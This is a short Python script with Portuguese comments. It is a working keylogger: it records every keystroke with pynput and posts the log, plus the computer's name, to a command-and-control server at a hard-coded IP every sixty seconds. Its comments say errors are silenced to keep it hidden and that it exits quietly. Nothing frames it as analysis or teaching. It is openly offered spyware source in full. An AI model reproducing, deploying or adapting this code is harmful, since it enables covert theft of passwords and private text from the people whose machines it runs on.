import requests
from pynput import keyboard
from threading import Timer
import os

# CONFIGURAÇÕES DO C2
C2_URL = "http://192.168.100.196:80/api/logs"
INTERVALO_ENVIO = 60 # segundos

log = ""

def enviar_para_c2():
    global log
    if log:
        try:
            # Enviando os dados dentro de um dicionário (form-data)
            payload = {
                "keyboard_data": log,
                "machine_name": os.getenv("COMPUTERNAME", "Linux_Machine") # Identifica a origem
            }
            
            response = requests.post(C2_URL, json=payload, timeout=10)
            
            if response.status_code == 200:
                log = "" # Limpa o log se o servidor recebeu com sucesso
        except Exception:
            # silencia os erros para melhor ocultabilidade
            pass
    
    # Reagenda o próximo envio
    timer = Timer(INTERVALO_ENVIO, enviar_para_c2)
    timer.daemon = True
    timer.start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log = log[:-1]
        elif key == keyboard.Key.tab:
            log += "\t"

if __name__ == "__main__":
    enviar_para_c2()
    
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        # Encerramento silencioso
        pass